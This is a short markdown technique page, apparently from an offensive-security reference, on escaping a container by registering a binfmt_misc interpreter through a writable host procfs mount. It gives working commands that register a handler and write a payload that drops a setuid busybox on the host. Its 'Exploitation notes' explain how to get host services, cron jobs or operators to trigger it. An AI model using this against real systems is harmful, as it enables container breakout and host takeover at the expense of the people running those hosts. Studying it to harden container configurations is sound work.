---
title: "binfmt_misc: host code execution through a registered interpreter"
description: "Escaping a container by registering a binfmt_misc interpreter through a writable host /proc/sys/fs/binfmt_misc, since registration is global to the host kernel, so when a host process later executes a file matching the registered magic the pinned interpreter runs in that host process's context."
keywords:
  - binfmt_misc
  - binary format handler
  - procfs escape
  - container escape
  - interpreter registration
---

# binfmt_misc

`binfmt_misc` lets the kernel run a chosen interpreter for files matching a magic byte sequence or extension, and its registration is global to the whole host kernel, not per-container. A container with a writable host `binfmt_misc` mount registers a handler; the interpreter is not run in the container's context, but when a process anywhere on the host later executes a matching file, the kernel runs the interpreter in that executing process's namespaces. A host-side exec is therefore the trigger.

```bash
# Register with the F flag so the interpreter file is opened and pinned AT REGISTRATION time,
# which lets a container-local payload be used (the kernel holds the fd).
printf ':esc:M::\\x7fESCAPE::/payload:F' > /proc/sys/fs/binfmt_misc/register
printf '#!/bin/sh\ncp /bin/busybox /host_marker; chmod +s /host_marker\n' > /payload && chmod +x /payload
# Now any HOST process that execs a file beginning with the magic bytes runs /payload in its context.
```

## Exploitation notes

- The escape is the host-side trigger: drop a file with the registered magic where a host service, cron, or operator will execute it, rather than executing it yourself inside the container.
- The `F` (fix binary) flag matters: it opens the interpreter at registration and keeps the descriptor, so a container-local payload works; without it the path is resolved at exec time in the triggering process's mount namespace.
- Registration requires the `binfmt_misc` filesystem mounted writable, which only happens in a privileged or deliberately misconfigured container.

## References

- [Kernel: binfmt_misc](https://docs.kernel.org/admin-guide/binfmt-misc.html)
- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
